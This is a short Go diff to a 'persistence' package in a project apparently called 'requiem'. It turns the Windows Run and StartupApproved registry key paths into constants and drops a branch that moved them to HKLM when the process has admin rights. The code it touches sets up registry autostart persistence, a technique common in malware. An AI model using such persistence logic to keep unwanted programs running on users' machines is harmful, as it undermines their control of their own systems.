@@ -2,13 +2,12 @@ package persistence
 
 import (
 	"fmt"
-	"strings"
 
 	"requiem/store"
 	"requiem/utils"
 )
 
-var (
+const (
 	START_ALLOWED string = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run"
 	AUTO_START    string = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
 )
@@ -45,11 +44,6 @@ func Persist(filePath string) bool {
 
 	if store.AUTO_RUN_REG {
 		persisted += 2
-
-		if store.IsAdmin {
-			START_ALLOWED = strings.Replace(START_ALLOWED, "HKCU", "HKLM", 1)
-			AUTO_START = strings.Replace(AUTO_START, "HKCU", "HKLM", 1)
-		}
 
 		err := utils.RunCommand(
 			"reg", "delete",
